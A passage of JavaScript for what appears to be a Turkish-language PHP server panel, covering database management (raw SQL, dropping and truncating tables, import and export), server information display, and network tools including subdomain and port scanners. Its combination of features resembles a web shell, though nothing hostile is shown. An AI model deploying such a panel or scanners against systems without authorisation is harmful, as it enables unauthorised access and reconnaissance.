        if (cb.checked) tableSelected.add(cb.dataset.tname); else tableSelected.delete(cb.dataset.tname);
        updateTableSelectInfo();
      }));
      document.getElementById('selectAllTables').addEventListener('change', (e) => {
        c.querySelectorAll('.table-check').forEach(cb => { cb.checked = e.target.checked; if (e.target.checked) tableSelected.add(cb.dataset.tname); else tableSelected.delete(cb.dataset.tname); });
        updateTableSelectInfo();
      });
      document.getElementById('btnDropSelectedTables').addEventListener('click', () => {
        const list = [...tableSelected];
        if (!list.length) return;
        openModal({
          title: 'Seçili Tabloları Sil',
          bodyHtml: `<p><b>${list.length} tablo</b> tamamen silinecek: ${esc(list.join(', '))}<br>Bu işlem geri alınamaz.</p>`,
          footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-danger" id="dropBulkGo">Sil</button>`
        });
        document.getElementById('dropBulkGo').addEventListener('click', async () => {
          try{
            const r = await api('db_drop_tables_bulk', { tables: list });
            closeModal();
            toast(r.dropped + ' tablo silindi' + (r.errors && r.errors.length ? ' (hatalar: ' + r.errors.join(' · ') + ')' : ''));
            loadDbTabContent();
          }catch(err){ toast(err.message, 'error'); }
        });
      });
      document.getElementById('btnTruncateSelectedTables').addEventListener('click', () => {
        const list = [...tableSelected];
        if (!list.length) return;
        openModal({
          title: 'Seçili Tabloları Boşalt',
          bodyHtml: `<p><b>${list.length} tablo</b>daki tüm veriler silinecek (yapı korunur): ${esc(list.join(', '))}<br>Bu işlem geri alınamaz.</p>`,
          footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-danger" id="truncBulkGo">Boşalt</button>`
        });
        document.getElementById('truncBulkGo').addEventListener('click', async () => {
          try{
            const r = await api('db_truncate_tables_bulk', { tables: list });
            closeModal();
            toast(r.truncated + ' tablo boşaltıldı' + (r.errors && r.errors.length ? ' (hatalar: ' + r.errors.join(' · ') + ')' : ''));
            loadDbTabContent();
          }catch(err){ toast(err.message, 'error'); }
        });
      });
      c.querySelectorAll('[data-table]').forEach(el => el.addEventListener('click', () => { currentTable = el.dataset.table; currentDbPage = 1; renderTableBrowser(); }));
      c.querySelectorAll('[data-truncate]').forEach(el => el.addEventListener('click', (e) => {
        e.stopPropagation();
        openModal({
          title:'Tabloyu Boşalt', bodyHtml:`<p>"${esc(el.dataset.truncate)}" tablosundaki <b>tüm satırları</b> silmek istediğinize emin misiniz? Tablo yapısı korunur, yalnızca veriler silinir. Bu işlem geri alınamaz.</p>`,
          footHtml:`<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-danger" id="truncGo">Boşalt</button>`
        });
        document.getElementById('truncGo').addEventListener('click', async () => {
          try{ await api('db_truncate_table', { table: el.dataset.truncate }); closeModal(); toast('Tablo boşaltıldı'); loadDbTabContent(); }
          catch(err){ toast(err.message,'error'); }
        });
      }));
      c.querySelectorAll('[data-drop]').forEach(el => el.addEventListener('click', (e) => {
        e.stopPropagation();
        openModal({
          title:'Tabloyu Sil', bodyHtml:`<p>"${esc(el.dataset.drop)}" tablosunu tamamen silmek istediğinize emin misiniz? Bu işlem geri alınamaz.</p>`,
          footHtml:`<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-danger" id="dropGo">Sil</button>`
        });
        document.getElementById('dropGo').addEventListener('click', async () => {
          try{ await api('db_drop_table', { table: el.dataset.drop }); closeModal(); toast('Tablo silindi'); loadDbTabContent(); }
          catch(err){ toast(err.message,'error'); }
        });
      }));
    }catch(e){ toast(e.message, 'error'); }
  }
  else if (dbTab === 'query'){
    c.innerHTML = `
      <div class="field"><textarea class="sql-textarea" id="sqlInput" placeholder="SELECT * FROM tablo_adi LIMIT 50;"></textarea></div>
      <button class="btn btn-primary" id="sqlRun">Çalıştır</button>
      <div id="sqlResult" style="margin-top:16px;"></div>
    `;
    document.getElementById('sqlRun').addEventListener('click', async () => {
      const sql = document.getElementById('sqlInput').value;
      const resultBox = document.getElementById('sqlResult');
      try{
        const res = await api('db_query', { sql });
        if (res.type === 'affected'){
          resultBox.innerHTML = `<div class="stat-card">Sorgu başarılı. Etkilenen satır: <b>${res.affected}</b> (${res.time}s)</div>`;
        } else {
          resultBox.innerHTML = `
            <div class="hint" style="margin-bottom:8px;">${res.count} satır — ${res.time}s</div>
            <div class="table-wrap"><table><thead><tr>${res.fields.map(f=>`<th>${esc(f)}</th>`).join('')}</tr></thead>
            <tbody>${res.rows.map(r => `<tr>${res.fields.map(f=>`<td class="mono">${esc(r[f])}</td>`).join('')}</tr>`).join('') || `<tr><td colspan="${res.fields.length||1}" class="muted" style="text-align:center;padding:16px;">Sonuç yok</td></tr>`}</tbody></table></div>
          `;
        }
      }catch(e){ resultBox.innerHTML = `<div class="stat-card" style="color:#e5484d;">${esc(e.message)}</div>`; }
    });
  }
  else if (dbTab === 'import'){
    c.innerHTML = `
      <div class="stat-card" style="max-width:520px;">
        <div class="label" style="margin-bottom:12px;">SQL Dosyası İçe Aktar</div>
        <input type="file" id="sqlImportFile" accept=".sql">
        <button class="btn btn-primary" id="sqlImportGo" style="margin-top:12px; width:100%; justify-content:center;">İçe Aktar</button>
        <div id="importResult" class="hint" style="margin-top:10px;"></div>
      </div>
    `;
    document.getElementById('sqlImportGo').addEventListener('click', async () => {
      const f = document.getElementById('sqlImportFile').files[0];
      if (!f) return toast('Dosya seçilmedi', 'error');
      const fd = new FormData();
      fd.append('sqlfile', f);
      try{
        const res = await api('db_import', fd, true);
        document.getElementById('importResult').textContent = res.statements + ' sorgu çalıştırıldı.' + (res.errors.length ? ' Hatalar: ' + res.errors.join('; ') : ' Başarılı.');
        toast('İçe aktarma tamamlandı');
      }catch(e){ toast(e.message, 'error'); }
    });
  }
  else if (dbTab === 'export'){
    try{
      const res = await api('db_tables');
      c.innerHTML = `
        <div class="stat-card" style="max-width:520px;">
          <div class="label" style="margin-bottom:12px;">Tüm Veritabanını Dışa Aktar</div>
          <button class="btn btn-primary" data-export-all="1">Tüm Veritabanını İndir (.sql)</button>
        </div>
        <div class="stat-card" style="max-width:520px; margin-top:14px;">
          <div class="label" style="margin-bottom:12px;">Tek Tablo Dışa Aktar</div>
          ${res.tables.map(t => `<button class="btn" style="margin:3px 4px 3px 0;" data-export-table="${esc(t.name)}">${esc(t.name)}.sql <span class="muted">(~${esc(t.size)})</span></button>`).join('')}
        </div>
      `;
      c.querySelector('[data-export-all]').addEventListener('click', () => exportDatabase(''));
      c.querySelectorAll('[data-export-table]').forEach(btn => btn.addEventListener('click', () => exportDatabase(btn.dataset.exportTable)));
    }catch(e){ toast(e.message,'error'); }
  }
  else if (dbTab === 'create'){
    c.innerHTML = `
      <div class="stat-card" style="max-width:640px;">
        <div class="field"><label>Tablo Adı</label><input type="text" id="ctName" placeholder="ornek_tablo"></div>
        <div id="ctCols"></div>
        <button class="btn" id="ctAddCol" style="margin-top:8px;">${ICONS.plus} Sütun Ekle</button>
        <div style="margin-top:16px;"><button class="btn btn-primary" id="ctGo">Tabloyu Oluştur</button></div>
      </div>
    `;
    const colsWrap = document.getElementById('ctCols');
    function addCol(name='', type='VARCHAR(255)', pk=false, ai=false){
      const row = document.createElement('div');
      row.className = 'field-row';
      row.style.alignItems = 'center';
      row.innerHTML = `
        <div class="field"><input type="text" placeholder="sutun_adi" class="ct-name" value="${esc(name)}"></div>
        <div class="field"><select class="ct-type">${['INT','BIGINT','VARCHAR(255)','TEXT','DATETIME','DATE','DECIMAL(10,2)','BOOLEAN','FLOAT'].map(t=>`<option ${t===type?'selected':''}>${t}</option>`).join('')}</select></div>
        <label style="display:flex;align-items:center;gap:4px;font-size:12px;white-space:nowrap;"><input type="checkbox" class="ct-pk checkbox" ${pk?'checked':''}> PK</label>
        <label style="display:flex;align-items:center;gap:4px;font-size:12px;white-space:nowrap;"><input type="checkbox" class="ct-ai checkbox" ${ai?'checked':''}> AI</label>
      `;
      colsWrap.appendChild(row);
    }
    addCol('id','INT',true,true);
    addCol('name','VARCHAR(255)');
    document.getElementById('ctAddCol').addEventListener('click', () => addCol());
    document.getElementById('ctGo').addEventListener('click', async () => {
      const table = document.getElementById('ctName').value.trim();
      const columns = [...colsWrap.querySelectorAll('.field-row')].map(r => ({
        name: r.querySelector('.ct-name').value.trim(),
        type: r.querySelector('.ct-type').value,
        pk: r.querySelector('.ct-pk').checked,
        ai: r.querySelector('.ct-ai').checked,
      })).filter(c => c.name);
      if (!table || !columns.length) return toast('Tablo adı ve en az bir sütun gerekli', 'error');
      try{ await api('db_create_table', { table, columns }); toast('Tablo oluşturuldu'); dbTab='tables'; renderDbTabs(); loadDbTabContent(); }
      catch(e){ toast(e.message, 'error'); }
    });
  }
}

async function renderTableBrowser(){
  const c = document.getElementById('dbTabContent');
  try{
    const res = await api('db_browse', { table: currentTable, page: currentDbPage });
    currentTablePk = res.pk;
    const totalPages = Math.max(1, Math.ceil(res.total / res.limit));
    c.innerHTML = `
      <div style="display:flex; align-items:center; gap:10px; margin-bottom:12px; flex-wrap:wrap;">
        <button class="btn btn-sm" id="backToTables">&larr; Tablolar</button>
        <div style="font-weight:600;">${esc(currentTable)}</div>
        <div class="select-info hidden" id="rowSelectInfo">
          <span id="rowSelectCount">0 satır seçildi</span>
          <button class="btn btn-sm btn-danger" id="btnDeleteSelectedRows">Seçilenleri Sil</button>
        </div>
        <div class="spacer"></div>
        <button class="btn btn-sm" id="addRowBtn">${ICONS.plus} Satır Ekle</button>
      </div>
      <div class="table-wrap">
        <table><thead><tr><th style="width:34px;"><input type="checkbox" class="checkbox" id="selectAllRows" ${res.pk?'':'disabled'}></th>${res.fields.map(f=>`<th>${esc(f)}${f===res.pk?' 🔑':''}</th>`).join('')}<th style="width:80px;"></th></tr></thead>
        <tbody>${res.rows.map(r => `
          <tr data-pkval="${esc(r[res.pk]??'')}">
            <td><input type="checkbox" class="checkbox row-select-check" data-pkval="${esc(r[res.pk]??'')}" ${res.pk?'':'disabled'}></td>
            ${res.fields.map(f => `<td class="editable-cell mono" data-field="${esc(f)}"><div class="cell-content">${r[f]===null?'<i class="muted">NULL</i>':esc(r[f])}</div></td>`).join('')}
            <td>
              <div class="row-actions" style="opacity:1;">
                <button class="icon-btn" data-editrow="1" title="Satırı Düzenle">${ICONS.edit}</button>
                <button class="icon-btn danger" data-delrow="1" title="Satırı Sil">${ICONS.trash}</button>
              </div>
            </td>
          </tr>`).join('') || `<tr><td colspan="${res.fields.length+2}" class="muted" style="text-align:center;padding:20px;">Kayıt yok</td></tr>`}
        </tbody></table>
      </div>
      <div class="pagination">
        <button class="btn btn-sm" id="pgPrev" ${currentDbPage<=1?'disabled':''}>&larr; Önceki</button>
        <span>Sayfa ${currentDbPage} / ${totalPages} (${res.total} kayıt)</span>
        <button class="btn btn-sm" id="pgNext" ${currentDbPage>=totalPages?'disabled':''}>Sonraki &rarr;</button>
      </div>
    `;
    document.getElementById('backToTables').addEventListener('click', () => { currentTable = null; loadDbTabContent(); });
    document.getElementById('pgPrev')?.addEventListener('click', () => { currentDbPage--; renderTableBrowser(); });
    document.getElementById('pgNext')?.addEventListener('click', () => { currentDbPage++; renderTableBrowser(); });
    document.getElementById('addRowBtn').addEventListener('click', () => openAddRowModal(res.fields));
    if (res.pk){
      const rowSelected = new Set();
      function updateRowSelectInfo(){
        const box = document.getElementById('rowSelectInfo');
        if (rowSelected.size > 0){ box.classList.remove('hidden'); document.getElementById('rowSelectCount').textContent = rowSelected.size + ' satır seçildi'; }
        else box.classList.add('hidden');
      }
      c.querySelectorAll('.row-select-check').forEach(cb => cb.addEventListener('change', () => {
        if (cb.checked) rowSelected.add(cb.dataset.pkval); else rowSelected.delete(cb.dataset.pkval);
        updateRowSelectInfo();
      }));
      document.getElementById('selectAllRows').addEventListener('change', (e) => {
        c.querySelectorAll('.row-select-check').forEach(cb => { cb.checked = e.target.checked; if (e.target.checked) rowSelected.add(cb.dataset.pkval); else rowSelected.delete(cb.dataset.pkval); });
        updateRowSelectInfo();
      });
      document.getElementById('btnDeleteSelectedRows').addEventListener('click', () => {
        const list = [...rowSelected];
        if (!list.length) return;
        openModal({
          title: 'Seçili Satırları Sil',
          bodyHtml: `<p><b>${list.length} satır</b> silinecek. Bu işlem geri alınamaz.</p>`,
          footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-danger" id="delRowsBulkGo">Sil</button>`
        });
        document.getElementById('delRowsBulkGo').addEventListener('click', async () => {
          try{
            const r = await api('db_rows_delete_bulk', { table: currentTable, pk: res.pk, pkVals: list });
            closeModal();
            toast(r.deleted + ' satır silindi' + (r.errors && r.errors.length ? ' (hatalar: ' + r.errors.join(' · ') + ')' : ''));
            renderTableBrowser();
          }catch(err){ toast(err.message, 'error'); }
        });
      });
      c.querySelectorAll('.editable-cell').forEach(td => td.addEventListener('dblclick', () => editCell(td)));
      c.querySelectorAll('[data-delrow]').forEach(btn => {
        btn.addEventListener('click', async (e) => {
          const tr = e.target.closest('tr');
          if (!confirm('Bu satırı silmek istediğinize emin misiniz?')) return;
          try{ await api('db_row_delete', { table: currentTable, pk: res.pk, pkVal: tr.dataset.pkval }); toast('Silindi'); renderTableBrowser(); }
          catch(err){ toast(err.message,'error'); }
        });
      });
      c.querySelectorAll('[data-editrow]').forEach(btn => {
        btn.addEventListener('click', (e) => {
          const tr = e.target.closest('tr');
          const rowData = res.rows.find(r => String(r[res.pk]) === tr.dataset.pkval);
          if (rowData) openEditRowModal(res.fields, rowData, res.pk);
        });
      });
    } else {
      c.querySelectorAll('[data-editrow], [data-delrow]').forEach(btn => btn.disabled = true);
    }
  }catch(e){ toast(e.message,'error'); }
}
function editCell(td){
  if (td.querySelector('textarea')) return;
  const contentEl = td.querySelector('.cell-content');
  const old = contentEl && contentEl.querySelector('i') ? '' : (contentEl ? contentEl.textContent : td.textContent);
  td.innerHTML = `<textarea class="cell-edit-input" rows="3">${esc(old)}</textarea>`;
  const inp = td.querySelector('textarea');
  inp.focus(); inp.select();
  const restore = (val) => { td.innerHTML = `<div class="cell-content">${val === '' ? '<i class="muted">NULL</i>' : esc(val)}</div>`; };
  const save = async () => {
    const val = inp.value;
    const tr = td.closest('tr');
    try{
      await api('db_row_update', { table: currentTable, pk: currentTablePk, pkVal: tr.dataset.pkval, data: { [td.dataset.field]: val } });
      restore(val);
      toast('Güncellendi');
    }catch(e){ toast(e.message,'error'); restore(old); }
  };
  inp.addEventListener('blur', save);
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) inp.blur();
    if (e.key === 'Escape') restore(old);
  });
}

function buildRowFormHtml(fields, pk, values){
  return fields.map(f => {
    const isPk = f === pk;
    const raw = values ? values[f] : '';
    const isNull = values ? values[f] === null : false;
    const val = isNull ? '' : (raw === undefined || raw === null ? '' : raw);
    const longText = typeof val === 'string' && val.length > 80;
    return `
      <div class="field">
        <label>${esc(f)}${isPk ? ' <span class="muted">(birincil anahtar)</span>' : ''}</label>
        <div style="display:flex; gap:8px; align-items:flex-start;">
          ${longText
            ? `<textarea data-f="${esc(f)}" rows="3" style="flex:1;" ${isNull?'disabled':''}>${esc(val)}</textarea>`
            : `<input type="text" data-f="${esc(f)}" value="${esc(val)}" ${isPk && values ? 'readonly' : ''} ${isNull?'disabled':''}>`
          }
          <label style="display:flex; align-items:center; gap:4px; font-size:11.5px; color:var(--text3); white-space:nowrap; padding-top:9px;">
            <input type="checkbox" class="checkbox" data-fnull="${esc(f)}" ${isNull?'checked':''}> NULL
          </label>
        </div>
      </div>`;
  }).join('');
}
function bindRowFormNullToggles(container){
  container.querySelectorAll('[data-fnull]').forEach(cb => {
    cb.addEventListener('change', () => {
      const input = container.querySelector(`[data-f="${CSS.escape(cb.dataset.fnull)}"]`);
      if (input) input.disabled = cb.checked;
    });
  });
}
function collectRowFormData(container, fields, pk, isEdit){
  const data = {};
  fields.forEach(f => {
    if (isEdit && f === pk) return;
    const nullCb = container.querySelector(`[data-fnull="${CSS.escape(f)}"]`);
    if (nullCb && nullCb.checked) { data[f] = null; return; }
    const input = container.querySelector(`[data-f="${CSS.escape(f)}"]`);
    if (input) data[f] = input.value;
  });
  return data;
}
function openEditRowModal(fields, rowData, pk){
  openModal({
    title: 'Satırı Düzenle', wide: true,
    bodyHtml: `<div id="rowFormBody">${buildRowFormHtml(fields, pk, rowData)}</div>`,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="editRowGo">Kaydet</button>`
  });
  const body = document.getElementById('rowFormBody');
  bindRowFormNullToggles(body);
  document.getElementById('editRowGo').addEventListener('click', async () => {
    const data = collectRowFormData(body, fields, pk, true);
    try{
      await api('db_row_update', { table: currentTable, pk, pkVal: rowData[pk], data });
      closeModal(); toast('Satır güncellendi'); renderTableBrowser();
    }catch(e){ toast(e.message,'error'); }
  });
}
function openAddRowModal(fields){
  openModal({
    title: 'Yeni Satır Ekle', wide: true,
    bodyHtml: `<div id="rowFormBody">${buildRowFormHtml(fields.filter(f => f !== currentTablePk), null, null)}</div>`,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="addRowGo">Ekle</button>`
  });
  const body = document.getElementById('rowFormBody');
  bindRowFormNullToggles(body);
  document.getElementById('addRowGo').addEventListener('click', async () => {
    const data = collectRowFormData(body, fields.filter(f => f !== currentTablePk), null, false);
    try{ await api('db_row_insert', { table: currentTable, data }); closeModal(); toast('Eklendi'); renderTableBrowser(); }
    catch(e){ toast(e.message,'error'); }
  });
}

async function loadServerInfo(){
  try{
    const res = await api('server_info');
    const el = document.getElementById('serverView');
    el.innerHTML = `
      <div class="cards-row">
        <div class="stat-card"><div class="label">PHP Sürümü</div><div class="value">${esc(res.php_version)}</div></div>
        <div class="stat-card"><div class="label">Disk Kullanımı</div><div class="value">${res.disk_used_pct??'-'}%</div></div>
        <div class="stat-card"><div class="label">Boş Disk</div><div class="value">${esc(res.disk_free)}</div></div>
        <div class="stat-card"><div class="label">Toplam Disk</div><div class="value">${esc(res.disk_total)}</div></div>
      </div>
      <div class="stat-card" style="margin-bottom:12px;">
        <div class="label" style="margin-bottom:10px;">Ağ / Alan Adı</div>
        <div style="font-size:13px; color:var(--text2); line-height:2;">
          Sunucu IP Adresi: <b style="color:var(--text)">${esc(res.server_addr)}</b><br>
          Sizin IP Adresiniz: <b style="color:var(--text)">${esc(res.client_addr)}</b><br>
          Bu Panele Erişilen Alan Adı: <b style="color:var(--text)">${esc(res.host)}</b>
        </div>
        <div class="hint">Not: PHP'den, hesapta barındırılan tüm alan adları/alt alan adlarının tam listesini güvenilir şekilde çıkarmak mümkün değildir (bu bilgi genelde sunucu panelinde/DNS'te tutulur). Bu yüzden yalnızca bu paneli açmak için kullanılan alan adı gösteriliyor.</div>
      </div>
      <div class="stat-card" style="margin-bottom:12px;">
        <div class="label" style="margin-bottom:10px;">Sistem</div>
        <div style="font-size:13px; color:var(--text2); line-height:2;">
          İşletim Sistemi: <b style="color:var(--text)">${esc(res.os)}</b><br>
          Sunucu Yazılımı: <b style="color:var(--text)">${esc(res.server_software)}</b><br>
          Belge Kökü: <b style="color:var(--text)">${esc(res.document_root)}</b><br>
          Panel Dosyasının Konumu: <b style="color:var(--text)">${esc(res.panel_path)}</b><br>
          Geçerli Kullanıcı: <b style="color:var(--text)">${esc(res.current_user)}</b><br>
          Bellek Limiti: <b style="color:var(--text)">${esc(res.memory_limit)}</b> · Max Yükleme: <b style="color:var(--text)">${esc(res.upload_max_filesize)}</b> · Max POST: <b style="color:var(--text)">${esc(res.post_max_size)}</b>
        </div>
      </div>
      <div class="stat-card">
        <div class="label" style="margin-bottom:10px;">Yüklü Eklentiler</div>
        <div>${Object.entries(res.extensions).map(([k,v]) => `<span class="badge ${v?'badge-green':'badge-gray'}" style="margin:2px;">${esc(k)} ${v?'✓':'✕'}</span>`).join('')}</div>
      </div>
    `;
  }catch(e){ toast(e.message, 'error'); }
}

/* =========================================================
   EK SEÇENEKLER
   ========================================================= */
function loadExtrasView(){
  const el = document.getElementById('extrasView');
  el.innerHTML = `
    <div class="cards-row">
      <button class="btn extras-card" id="extraPhpInfo">
        ${ICONS.info}<div><div class="extras-card-title">PHP Bilgisi</div><div class="extras-card-sub">phpinfo() çıktısını yeni sekmede aç</div></div>
      </button>
      <button class="btn extras-card" id="extraErrorLog">
        ${ICONS.alert}<div><div class="extras-card-title">Hata Günlüğü</div><div class="extras-card-sub">PHP error_log'un son satırlarını göster</div></div>
      </button>
      <button class="btn extras-card" id="extraSsl">
        ${ICONS.key}<div><div class="extras-card-title">SSL Sertifika Bilgisi</div><div class="extras-card-sub">Herhangi bir alan adının sertifika geçerliliğini kontrol et</div></div>
      </button>
      <button class="btn extras-card" id="extraWhois">
        ${ICONS.info}<div><div class="extras-card-title">WHOIS Sorgusu</div><div class="extras-card-sub">Alan adı kayıt bilgilerini görüntüle</div></div>
      </button>
      <button class="btn extras-card" id="extraDns">
        ${ICONS.server}<div><div class="extras-card-title">DNS Kayıtları</div><div class="extras-card-sub">A, MX, TXT, NS, CNAME kayıtlarını listele</div></div>
      </button>
      <button class="btn extras-card" id="extraSubdomain">
        ${ICONS.folder}<div><div class="extras-card-title">Subdomain Tarayıcı</div><div class="extras-card-sub">Yaygın alt alan adlarını tara ve bul</div></div>
      </button>
      <button class="btn extras-card" id="extraPortScan">
        ${ICONS.plug}<div><div class="extras-card-title">Açık Port Tarayıcı</div><div class="extras-card-sub">Sunucuda hangi yaygın portlar açık, kontrol et</div></div>
      </button>
      <button class="btn extras-card" id="extraHttpHeader">
        ${ICONS.code}<div><div class="extras-card-title">HTTP Başlık Kontrolü</div><div class="extras-card-sub">Bir URL'nin durum kodu ve yanıt başlıklarını gör</div></div>
      </button>
    </div>
    <div id="extrasDetail"></div>
  `;
  document.getElementById('extraPhpInfo').addEventListener('click', () => {
    window.open('?stream=phpinfo&csrf=' + CSRF, '_blank');
  });
  document.getElementById('extraErrorLog').addEventListener('click', showErrorLog);
  document.getElementById('extraSsl').addEventListener('click', () => showDomainToolForm('ssl'));
  document.getElementById('extraWhois').addEventListener('click', () => showDomainToolForm('whois'));
  document.getElementById('extraDns').addEventListener('click', () => showDomainToolForm('dns'));
  document.getElementById('extraSubdomain').addEventListener('click', () => showDomainToolForm('subdomain'));
  document.getElementById('extraPortScan').addEventListener('click', () => showDomainToolForm('port'));
  document.getElementById('extraHttpHeader').addEventListener('click', () => showDomainToolForm('http'));
}

const DOMAIN_TOOL_META = {
  ssl: { title: 'SSL Sertifika Bilgisi', placeholder: 'ornek.com', btn: 'Kontrol Et' },
  whois: { title: 'WHOIS Sorgusu', placeholder: 'ornek.com', btn: 'Sorgula' },
  dns: { title: 'DNS Kayıtları', placeholder: 'ornek.com', btn: 'Sorgula' },
  subdomain: { title: 'Subdomain Tarayıcı', placeholder: 'ornek.com', btn: 'Tara' },
  port: { title: 'Açık Port Tarayıcı', placeholder: 'ornek.com veya IP adresi', btn: 'Tara' },
  http: { title: 'HTTP Başlık Kontrolü', placeholder: 'https://ornek.com/sayfa', btn: 'Kontrol Et' },
};
function showDomainToolForm(tool){
  const meta = DOMAIN_TOOL_META[tool];
  const detail = document.getElementById('extrasDetail');
  detail.innerHTML = `
    <div class="stat-card" style="max-width:520px;">
      <div class="label" style="margin-bottom:12px;">${esc(meta.title)}</div>
      <div class="field-row">
        <div class="field"><input type="text" id="domainToolInput" placeholder="${esc(meta.placeholder)}"></div>
        <button class="btn btn-primary" id="domainToolGo">${esc(meta.btn)}</button>
      </div>
      ${tool === 'port' ? '<div class="hint">Yaygın ~21 port taranır, tamamlanması birkaç saniye sürebilir.</div>' : ''}
      <div id="domainToolResult" style="margin-top:14px;"></div>
    </div>`;
  const inp = document.getElementById('domainToolInput');
  inp.focus();
  const run = () => runDomainTool(tool, inp.value.trim());
  document.getElementById('domainToolGo').addEventListener('click', run);
  inp.addEventListener('keydown', e => { if (e.key === 'Enter') run(); });
}
async function runDomainTool(tool, value){
  if (!value) return toast('Bir alan adı/adres girin', 'error');
  const box = document.getElementById('domainToolResult');
  box.innerHTML = '<div class="muted">Sorgulanıyor...</div>';
  const btn = document.getElementById('domainToolGo');
  btn.disabled = true;
  try{
    if (tool === 'ssl'){
      const res = await api('ssl_cert_info', { domain: value });
      let color = 'var(--success)', text = (res.daysLeft ?? '?') + ' gün kaldı';
      if (res.daysLeft !== null){
        if (res.daysLeft < 0){ color = 'var(--danger)'; text = 'SÜRESİ DOLMUŞ'; }
        else if (res.daysLeft < 14) color = 'var(--danger)';
        else if (res.daysLeft < 30) color = '#c9a86a';
      }
      box.innerHTML = `
        <div style="font-size:13px; color:var(--text2); line-height:2;">
          Alan Adı (CN): <b style="color:var(--text)">${esc(res.commonName)}</b><br>
          Veren Kurum: <b style="color:var(--text)">${esc(res.issuer)}</b><br>
          Başlangıç: <b style="color:var(--text)">${esc(res.validFrom)}</b><br>
          Bitiş: <b style="color:var(--text)">${esc(res.validTo)}</b><br>
          Durum: <b style="color:${color};">${esc(text)}</b>
        </div>`;
    } else if (tool === 'whois'){
      const res = await api('whois_lookup', { domain: value });
      box.innerHTML = `<pre class="log-view">${esc(res.raw)}</pre>`;
    } else if (tool === 'dns'){
      const res = await api('dns_lookup', { domain: value });
      box.innerHTML = res.records.length ? `
        <div class="table-wrap"><table><thead><tr><th>Tür</th><th>Host</th><th>Değer</th><th>TTL</th></tr></thead>
        <tbody>${res.records.map(r => `<tr><td class="mono">${esc(r.type)}</td><td class="mono">${esc(r.host)}</td><td class="mono">${esc(r.value)}</td><td class="muted">${esc(r.ttl)}</td></tr>`).join('')}</tbody></table></div>
      ` : '<div class="muted">Hiç DNS kaydı bulunamadı.</div>';
    } else if (tool === 'subdomain'){
      const res = await api('subdomain_scan', { domain: value });
      box.innerHTML = `
        <div class="hint" style="margin-bottom:8px;">${res.checked} yaygın alt alan adı denendi, ${res.found.length} tanesi bulundu.</div>
        ${res.found.length ? `<div class="table-wrap"><table><thead><tr><th>Alt Alan Adı</th><th>IP</th></tr></thead>
        <tbody>${res.found.map(f => `<tr><td class="mono">${esc(f.sub)}</td><td class="mono">${esc(f.ip)}</td></tr>`).join('')}</tbody></table></div>` : ''}`;
    } else if (tool === 'port'){
      const res = await api('port_scan', { host: value });
      box.innerHTML = `
        <div class="hint" style="margin-bottom:8px;">${res.checked} yaygın port denendi, ${res.open.length} tanesi açık.</div>
        ${res.open.length ? `<div style="display:flex; flex-wrap:wrap; gap:6px;">${res.open.map(p => `<span class="badge badge-green">${esc(p.port)} · ${esc(p.service)}</span>`).join('')}</div>` : '<div class="muted">Hiçbir yaygın port açık bulunamadı.</div>'}`;
    } else if (tool === 'http'){
      const res = await api('http_header_check', { url: value });
      const statusLine = res.headers['0'] || '';
      const rows = Object.entries(res.headers).filter(([k]) => k !== '0');
      box.innerHTML = `
        <div class="hint" style="margin-bottom:8px; font-family:var(--mono);">${esc(statusLine)}</div>
        <div class="table-wrap"><table><tbody>${rows.map(([k,v]) => `<tr><td class="mono" style="width:180px;">${esc(k)}</td><td class="mono">${esc(Array.isArray(v)?v.join(', '):v)}</td></tr>`).join('')}</tbody></table></div>`;
    }
  }catch(e){
    box.innerHTML = `<div style="color:var(--danger);">${esc(e.message)}</div>`;
  }
  btn.disabled = false;
}


async function quickEditFile(filename){
  try{
    await goToPath(PANEL_START_DIR);
    const exists = currentItems.some(i => i.name === filename);
    if (!exists){
      await api('fm_mkfile', { path: currentPath, name: filename });
      await loadFiles(currentPath);
    }
    openEditor(filename);
  }catch(e){ toast(e.message, 'error'); }
}

async function showErrorLog(){
  const detail = document.getElementById('extrasDetail');
  detail.innerHTML = `<div class="stat-card"><div class="label" style="margin-bottom:10px;">Hata Günlüğü</div><div class="muted">Yükleniyor...</div></div>`;
  try{
    const res = await api('read_error_log');
    detail.innerHTML = `
      <div class="stat-card">
        <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
          <div class="label" style="margin:0;">Hata Günlüğü</div>
          <span class="muted">${esc(res.path)} · ${esc(res.size)}</span>
          <div class="spacer"></div>
          <button class="btn btn-sm" id="errLogRefresh">${ICONS.refresh} Yenile</button>
        </div>
        ${res.truncated ? '<div class="hint">Dosya büyük olduğu için yalnızca son ~200KB gösteriliyor.</div>' : ''}
        <pre class="log-view">${esc(res.content) || '(günlük boş)'}</pre>
      </div>`;
    document.getElementById('errLogRefresh').addEventListener('click', showErrorLog);
  }catch(e){
    detail.innerHTML = `<div class="stat-card" style="color:var(--danger);">${esc(e.message)}</div>`;
  }
}

async function showSslInfo(){
  const detail = document.getElementById('extrasDetail');
  detail.innerHTML = `<div class="stat-card"><div class="label" style="margin-bottom:10px;">SSL Sertifika Bilgisi</div><div class="muted">Kontrol ediliyor...</div></div>`;
  try{
    const res = await api('ssl_cert_info');
    let statusColor = 'var(--success)';
    let statusText = 'Geçerli';
    if (res.daysLeft !== null){
      if (res.daysLeft < 0){ statusColor = 'var(--danger)'; statusText = 'SÜRESİ DOLMUŞ'; }
      else if (res.daysLeft < 14){ statusColor = 'var(--danger)'; statusText = res.daysLeft + ' gün kaldı'; }
      else if (res.daysLeft < 30){ statusColor = '#c9a86a'; statusText = res.daysLeft + ' gün kaldı'; }
      else statusText = res.daysLeft + ' gün kaldı';
    }
    detail.innerHTML = `
      <div class="stat-card" style="max-width:480px;">
        <div class="label" style="margin-bottom:10px;">SSL Sertifika Bilgisi — ${esc(res.host)}</div>
        <div style="font-size:13px; color:var(--text2); line-height:2;">
          Alan Adı (CN): <b style="color:var(--text)">${esc(res.commonName)}</b><br>
          Veren Kurum: <b style="color:var(--text)">${esc(res.issuer)}</b><br>
          Geçerlilik Başlangıcı: <b style="color:var(--text)">${esc(res.validFrom)}</b><br>
          Geçerlilik Bitişi: <b style="color:var(--text)">${esc(res.validTo)}</b><br>
